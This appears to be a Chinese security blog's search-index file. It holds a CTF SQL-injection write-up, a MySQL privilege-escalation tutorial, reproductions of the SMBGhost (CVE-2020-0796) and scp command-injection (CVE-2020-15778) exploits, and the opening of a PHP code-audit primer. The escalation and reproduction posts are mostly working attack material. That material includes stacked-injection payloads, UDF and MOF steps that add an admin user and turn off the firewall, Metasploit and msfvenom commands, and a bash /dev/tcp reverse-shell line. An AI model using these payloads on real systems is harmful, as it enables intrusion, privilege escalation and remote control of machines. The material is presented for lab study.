<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2019强网杯 随便注</title>
      <link href="2021/04/25/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>2021/04/25/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="2019-强网杯-随便注"><a href="#2019-强网杯-随便注" class="headerlink" title="[2019 强网杯]随便注"></a>[2019 强网杯]随便注</h2><p><strong>访问题目站点，随便输入就能看到返回结果</strong></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105155916668.png" alt="image-20210105155916668"></p><p><strong>输入<code>&#39;</code>测试是否存在注入点</strong></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105155958771.png" alt="image-20210105155958771"></p><blockquote><p>发现报错，可以猜测此注入为字符型注入</p></blockquote><p><strong>构造SQL语句返回能查看的所有值</strong></p><pre class=" language-php"><code class="language-php"><span class="token number">1</span>' <span class="token keyword">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token shell-comment comment">#</span></code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160146124.png" alt="image-20210105160146124"></p><p><strong>爆出所在表字段数</strong></p><pre class=" language-php"><code class="language-php"><span class="token number">1</span>' order by <span class="token number">2</span><span class="token shell-comment comment">#        </span><span class="token comment" spellcheck="true">//正常回显</span><span class="token number">1</span>' order by <span class="token number">3</span><span class="token shell-comment comment">#        </span><span class="token comment" spellcheck="true">//出现报错</span></code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160103617.png" alt="image-20210105160103617"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160123586.png" alt="image-20210105160123586"></p><blockquote><p>证明有2个字段</p></blockquote><p><strong>尝试爆所在数据库</strong></p><pre class=" language-php"><code class="language-php"><span class="token number">1</span>' union select <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment">#</span></code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160226584.png" alt="image-20210105160226584"></p><blockquote><p>返回了一串代码，说明<code>select</code>函数被过滤</p><p>那么<code>select union</code>查询就无法使用了</p></blockquote><h3 id="堆栈注入"><a href="#堆栈注入" class="headerlink" title="堆栈注入"></a><strong>堆栈注入</strong></h3><p><strong>堆叠注入(堆叠查询，Stacked Queries)</strong></p><p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p><h4 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h4><p>在SQL中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p><h4 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h4><p>堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。</p><p><strong>查看所有数据库</strong></p><pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span>show databases<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160301517.png" alt="image-20210105160301517"></p><p><strong>查看当前数据库下的所有表</strong></p><pre class=" language-php"><code class="language-php"><span class="token number">1</span>'<span class="token punctuation">;</span>show tables<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160324351.png" alt="image-20210105160324351"></p><p><strong>查看表结构</strong></p><pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span>desc `<span class="token number">1919810931114514</span>`<span class="token punctuation">;</span>desc `words`<span class="token shell-comment comment">#</span></code></pre><blockquote><p>在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p></blockquote><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160412946.png" alt="image-20210105160412946"></p><blockquote><p><strong>发现flag在<code>1919810931114514</code>表里</strong></p></blockquote><p><strong>判断出查询语句</strong></p><pre class=" language-php"><code class="language-php">selsect id<span class="token punctuation">,</span>data from words where id <span class="token operator">=</span> <span class="token operator">?</span></code></pre><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class=" language-php"><code class="language-php"><span class="token number">0</span>'<span class="token punctuation">;</span>rename table words to words1<span class="token punctuation">;</span>rename table `<span class="token number">1919810931114514</span>` to words<span class="token punctuation">;</span>alter table words change flag id <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token constant">CHARACTER</span> <span class="token constant">SET</span> utf8 <span class="token constant">COLLATE</span> utf8_general_ci <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>desc  words<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre><blockquote><p><strong>由于可以堆叠查询，这时候就想到了一个改名的方法</strong></p><p><strong>把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag啦</strong></p></blockquote><p><strong><code>1&#39;or 1=1#</code>爆出表所有内容</strong></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160530680.png" alt="image-20210105160530680"></p><h3 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h3><pre class=" language-php"><code class="language-php"><span class="token constant">PREPARE</span> name from <span class="token string">'[mysql sequece]'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//预定义SQL语句</span><span class="token constant">EXECUTE</span> name<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//执行预定义SQL语句</span><span class="token punctuation">(</span><span class="token constant">DEALLOCATE</span> <span class="token operator">||</span> <span class="token constant">DROP</span><span class="token punctuation">)</span> <span class="token constant">PREPARE</span> name<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//删除预定义SQL        语句</span></code></pre><p><strong>预定义语句也可以通过变量进行传递</strong></p><pre class=" language-php"><code class="language-php"><span class="token constant">SET</span> @tn <span class="token operator">=</span> <span class="token string">'hahaha'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//存储表名</span><span class="token constant">SET</span> @sql <span class="token operator">=</span> <span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'select * from '</span><span class="token punctuation">,</span> @tn<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//存储SQL语句</span><span class="token constant">PREPARE</span> name from @sql<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//预定义SQL语句</span><span class="token constant">EXECUTE</span> name<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//执行预定义SQL语句</span><span class="token punctuation">(</span><span class="token constant">DEALLOCATE</span> <span class="token operator">||</span> <span class="token constant">DROP</span><span class="token punctuation">)</span> <span class="token constant">PREPARE</span> sqla<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//删除预定义SQL语句</span></code></pre><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p>利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p><blockquote><p><strong>不使用变量</strong></p></blockquote><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">';PREPARE hacker from concat(char(115,101,108,101,99,116), '</span> <span class="token operator">*</span> from `<span class="token number">1919810931114514</span>` '<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">EXECUTE</span> hacker<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre><blockquote><p><strong>使用变量</strong></p></blockquote><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">';SET @sqli=concat(char(115,101,108,101,99,116),'</span><span class="token operator">*</span> from `<span class="token number">1919810931114514</span>`'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">PREPARE</span> hacker from @sqli<span class="token punctuation">;</span><span class="token constant">EXECUTE</span> hacker<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre><blockquote><p><strong>只是用contact(),不使用char()</strong></p></blockquote><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">';PREPARE hacker from concat('</span>s<span class="token string">','</span>elect<span class="token string">', '</span> <span class="token operator">*</span> from `<span class="token number">1919810931114514</span>` '<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">EXECUTE</span> hacker<span class="token punctuation">;</span><span class="token shell-comment comment">#</span></code></pre><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="https://www.cnblogs.com/yingmo/p/6148360.html">MySQL中concat函数</a></p><p><a href="https://blog.csdn.net/u010002184/article/details/79354136?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_v29-1-79354136.nonecase&utm_term=%E4%BF%AE%E6%94%B9mysql%20%E5%AD%97%E6%AE%B5%E5%90%8D&spm=1000.2123.3001.4430">Mysql修改字段名、修改字段类型</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL提权</title>
      <link href="2021/04/11/MySQL%E6%8F%90%E6%9D%83/"/>
      <url>2021/04/11/MySQL%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><blockquote><p>流程：服务探针——信息收集——提权利用——获取权限</p></blockquote><p><strong>提权前提：</strong>获取数据库最高管理员的账户密码</p><ul><li>读取网站数据库配置文件（了解其命名规则及查找技巧）</li></ul><pre><code>sql、data、inc、config、conn、database、common、include</code></pre><ul><li>读取数据库存储或备份文件（了解数据库存储格式及对应内容）</li></ul><pre><code>@@basedir/data/数据库名/表名.MYD    (表内容)</code></pre><ul><li>暴力破解（了解数据库是否支持外联及如何开启外联）</li></ul><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>利用root权限，创建带有调用cmd函数的<code>udf.dll</code>(动态链接库)。当我们把<code>udf.dll</code>导出指定文件夹引入MySQL时，其中的调用函数拿出来当作MySQL的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用<code>CREAT FUNCITON</code>调用dll中的函数后，MySQL账号转化为system权限，从而来提权。</p><blockquote><p>MySQL &lt; 5.1    <code>udf.dll</code>文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于<code>c:\winnt\system32</code>。</p><p>MySQL =&gt; 5.1    <code>udf.dll</code>文件必须放置于<code>MYSQL安装目录下的lib\plugin</code>文件夹下。</p></blockquote><p><strong>查看数据库服务版本信息</strong></p><pre class=" language-mysql"><code class="language-mysql">select @@version;select version();</code></pre><p><strong>查看数据库安装目录</strong></p><pre class=" language-mysql"><code class="language-mysql">select @@basedir;select basedir();</code></pre><p><strong>查看MySQL安装路径</strong></p><pre class=" language-mysql"><code class="language-mysql">show variables like '%plugins%'; </code></pre><p><strong>利用<code>NTFS ADS</code>创建<code>lib</code>目录</strong></p><pre class=" language-mysql"><code class="language-mysql">select 'x' into dumpfile '安装目录\\lib::$INDEX_ALLOCATION';</code></pre><p><strong>利用<code>NTFS ADS</code>创建<code>plugin</code>目录</strong></p><pre class=" language-mysql"><code class="language-mysql">select 'x' into dumpfile '安装目录\\lib\\plugin::$INDEX_ALLOCATION';</code></pre><p><strong>UDF提权文件所在位置</strong></p><p>msf的UDF文件原C++函数没有写异常处理，那么MySQL加载的时候会使MySQL出错导致断开连接。</p><blockquote><p>metasploit下的动态链接库</p></blockquote><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101535951.png" alt="image-20210410101535951"></p><blockquote><p>sqlmap下的动态链接库</p></blockquote><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101703903.png" alt="image-20210410101703903"></p><blockquote><p>sqlmap下的4个UDF文件是经过编码的，如果直接丢在MySQL的<code>plugin</code>目录下是无法加载的，需要用<code>sqlmap/extra/cloak/cloak.py</code>进行解码</p></blockquote><pre class=" language-shell"><code class="language-shell">python .\cloak.py -d -i ..\..\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll</code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101854163.png" alt="image-20210410101854163"></p><p><strong>导出<code>dll</code>到指定目录</strong></p><p>可以使用msf中<code>mysql_udf_payload</code>模块</p><blockquote><p>条件：</p><p><code>secure_auth=YES</code>    (运行导出文件)</p><p><code>secure_file_prive=空</code>    (可以导出任意文件到任意位置)</p></blockquote><p><strong>查看是否允许文件导出导入</strong></p><pre class=" language-mysql"><code class="language-mysql">show variables like "%secure%";</code></pre><p><strong>导出<code>dll</code></strong></p><pre class=" language-mysql"><code class="language-mysql">select 'lib_mysqludf_sys.dll' into outfile '安装目录/lib/pulgin/udf.dll';</code></pre><p><strong>创建<code>cmdshell</code> 函数</strong> (该函数叫什么名字在后续中则使用该函数进行查询)</p><pre class=" language-mysql"><code class="language-mysql">create function cmdshell returns string soname 'udf.dll';# [AGGREATE]是聚集函数的表示，系统定义的聚集函数比如有COUNT()、AVE()、MN()、MAX()、SUM()# SONAME 'file'表示这个函数从哪个文件里面引入，而这个文件一般是动态链接库，windows下是dll，linux是so，并且这个文件要在mysql的plugin目录下</code></pre><p><strong>执行命令</strong></p><pre class=" language-mysql"><code class="language-mysql">select cmdshell('whoami');# 关闭windows防火墙和筛选select cmdshell('net stop policyagent');     select cmdshell('net stop sharedaccess');select cmdshell('netsh advfirewall set allprofiles state off');</code></pre><p><strong><code>udf.dll</code>下常见函数</strong></p><pre class=" language-shell"><code class="language-shell">cmdshell     //执行cmd;downloader     //下载者,到网上下载指定文件并保存到指定目录;open3389     //通用开3389终端服务,可指定端口(不改端口无需重启);backshell     //反弹Shell;ProcessView //枚举系统进程;KillProcess //终止指定进程;regread     //读注册表;regwrite     //写注册表;shut         //关机,注销,重启;about         //说明与帮助函数;</code></pre><h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF是windows系统的一个文件（在<code>c:/windows/system32/wbem/mof/nullevt.mof</code>）叫做<code>托管对象格式</code>其作用是每隔五秒就会去监控进程创建和死亡。</p><p>其实就是用了MySQL的root权限了以后，然后使用root权限去执行我们上传的MOF。隔了一定时间以后这个MOF就会被执行，这个MOF当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p><p><strong>MOF提权过程:</strong></p><ol><li>将MOF上传至任意可读可写目录下</li><li>更改MOF文件代码</li></ol><pre class=" language-shell"><code class="language-shell">#pragma namespace("\\\\.\\root\\subscription") instance of __EventFilter as $EventFilter &#123;     EventNamespace = "Root\\Cimv2";     Name  = "filtP2";     Query = "Select * From __InstanceModificationEvent "             "Where TargetInstance Isa \"Win32_LocalTime\" "             "And TargetInstance.Second = 5";     QueryLanguage = "WQL"; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123;     Name = "consPCSV2";     ScriptingEngine = "JScript";     ScriptText =     "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"; &#125;; instance of __FilterToConsumerBinding &#123;     Consumer   = $Consumer;     Filter = $EventFilter; &#125;;</code></pre><ol start="3"><li>使用SQL语句将系统当中默认的<code>nullevt.mof</code>给替换掉</li></ol><pre class=" language-mysql"><code class="language-mysql">select load_file('D:\wamp\xishaonian.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';</code></pre><h3 id="MSF进行MOF提权"><a href="#MSF进行MOF提权" class="headerlink" title="MSF进行MOF提权"></a>MSF进行MOF提权</h3><blockquote><p>Msf下的<code>exploit/windows/mysql/mysql_mof</code>模块提供了直接MOF提权，不过该漏洞成功跟操作系统权限和MySQL数据库版本有关，执行成功后会直接反弹shell到meterpreter。</p></blockquote><pre class=" language-shell"><code class="language-shell">use exploit/windows/mysql/mysql_mofset rhost IP //设置需要提权的远程主机IP地址set rport 3306 //设置mysql的远程端口set password root //设置mysql数据库root密码set username root //设置mysql用户名show options //查看设置exploit</code></pre><blockquote><p>MySQL允许远程root登入</p></blockquote><pre class=" language-mysql"><code class="language-mysql">一:use mysql;update user set host = '%' where user = 'root';FLUSH PRIVILEGES ;二:GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION;FLUSH PRIVILEGES;</code></pre><h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><blockquote><p>导出自定义可执行文件到启动目录配合重启执行</p><p>将创建好的后门或执行文件进行服务器启动项写入,配合重启执行</p></blockquote><p><strong>MSF进行启动项提权</strong></p><pre class=" language-shell"><code class="language-shell">use exploit/windows/mysql/mysql_start_upset rhost IP //设置需要提权的远程主机IP地址set rport 3306 //设置mysql的远程端口set password root //设置mysql数据库root密码set username root //设置mysql用户名show options //查看设置exploit</code></pre><p><a href="https://xz.aliyun.com/t/2719">Windows下三种MySQL提权剖析</a></p><p><a href="https://www.cnblogs.com/yzloo/p/10390916.html">MySQL数据库渗透及漏洞利用总结</a></p><p><a href="https://www.cnblogs.com/xishaonian/p/6384535.html">mof提权原理及其过程</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
      <link href="2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>SMB远程代码执行漏洞</p><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p><p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p><p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p></blockquote><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64-based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation)</code></pre><p><strong>漏洞复现工具下载</strong></p><p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p><p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p><p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p><h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p><pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）</code></pre><ol><li><strong>将目标机的防火墙关闭</strong></li><li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li></ol><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p><ol start="3"><li><strong>利用下载的poc脚本发起攻击</strong></li></ol><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p><pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）</code></pre><ol><li><strong>生成一个反弹木马</strong></li></ol><pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python   说明:    #-p payload   #-e 编码方式   #-i 编码次数   #-b 过滤坏字符   #LHOST,LPORT 监听上线的主机IP和端口   #-f python 生成python格式   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。</code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p><ol start="2"><li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li></ol><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p><ol start="3"><li><strong>开启msf监听模块</strong></li></ol><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p><ol start="4"><li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li></ol><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p><blockquote><p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> Windows 10 </tag>
            
            <tag> SMB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-15778 OpenSSL漏洞复现</title>
      <link href="2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-15778-OpenSSL"><a href="#CVE-2020-15778-OpenSSL" class="headerlink" title="CVE-2020-15778 OpenSSL"></a>CVE-2020-15778 OpenSSL</h1><p><strong>影响版本</strong>：</p><blockquote><p>OpenSSH &lt;= 8.3p1 </p></blockquote><p><strong>漏洞介绍</strong></p><blockquote><p>漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。</p></blockquote><p><strong>局限性</strong></p><blockquote><p>适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote><p>使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS)</p></blockquote><ol><li><strong>关闭自带防火墙(firewalld)</strong></li></ol><pre class=" language-shell"><code class="language-shell">停止firewalld服务 $ systemctl stop firewalld</code></pre><ol start="2"><li><strong>设置iptables策略</strong></li></ol><pre class=" language-shell"><code class="language-shell">service iptables startiptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROPservice iptables saveiptables -L -n --line-number </code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224210808492.png" alt="image-20210224210808492"></p><p><strong>验证</strong></p><blockquote><p>scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。</p></blockquote><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211255664.png" alt="image-20210224211255664"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211123362.png" alt="image-20210224211123362"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>在kali里面新建1.sh，写入反弹shell的bash命令</strong></p><pre class=" language-shell"><code class="language-shell">bash -i >& /dev/tcp/10.7.5.120>&1</code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211415668.png" alt="image-20210224211415668"></p><p><strong>kali监听6666端口</strong></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211522082.png" alt="image-20210224211522082"></p><p><strong>使用scp命令传输文件到CentOS的/tmp目录</strong></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211630066.png" alt="image-20210224211630066"></p><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211703168.png" alt="image-20210224211703168"></p><p><strong>命令执行，运行1.sh</strong></p><pre class=" language-shell"><code class="language-shell">scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`'</code></pre><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211800626.png" alt="image-20210224211800626"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>scp命令源码</p></blockquote><pre class=" language-shell"><code class="language-shell">if (remin == -1) &#123;    xasprintf(&bp, "%s -t %s%s", cmd,        *targ == '-' ? "-- " : "", targ);    if (do_cmd(thost, tuser, tport, bp, &remin,        &remout) < 0)        exit(1);    if (response() < 0)        exit(1);    free(bp);&#125;</code></pre><p><strong>当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。</strong></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>补丁/升级</p>]]></content>
      
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础概念</title>
      <link href="2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/"/>
      <url>2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h4><ul><li>Notepad++</li><li>Visual Studio Code</li></ul><h4 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h4><ul><li>Seay源代码审计系统</li><li>Firtufy SCA</li><li>RIPS</li></ul><h4 id="漏洞验证辅助"><a href="#漏洞验证辅助" class="headerlink" title="漏洞验证辅助"></a>漏洞验证辅助</h4><ul><li>BurpSuite Community</li><li>浏览器扩展</li><li>编码转换、加密解密工具 </li><li>正则调试工具</li><li>SQL执行监控工具</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote><ol><li>检查铭感函数的参数，然后回溯变量，判断变量是否可控并且没有经过严格的过滤（逆向追踪）</li><li>找出哪些文件在接收外部传入的参数，然后跟踪变量的传递过程，观察是否有变量传入到高危函数中，或者传递的过程中是否有代码逻辑漏洞（正向追踪）</li><li>直接挖掘功能点漏洞，根据自身的禁言判断该类应用通常在哪些功能中会出现漏洞，直接全篇阅读该功能代码</li></ol><ul><li>学好代码审计需要掌握一下几点<ul><li>PHP编程语言的特性和基础</li><li>Web前端编程基础</li><li>漏洞形成原理</li><li>代码审计思路</li><li>不同系统、中间件之间的特性差异</li></ul></li></ul></blockquote><h3 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h3><p>​                                                            <strong>常见<code>PHP_INI_*</code>常量的定义</strong></p><table><thead><tr><th align="center">常量</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center"><strong>PHP_INI_USER</strong></td><td align="center">该配置选项可在用户的PHP脚本或Windows注册表中设置</td></tr><tr><td align="center"><strong>PHP_INI_PERDIR</strong></td><td 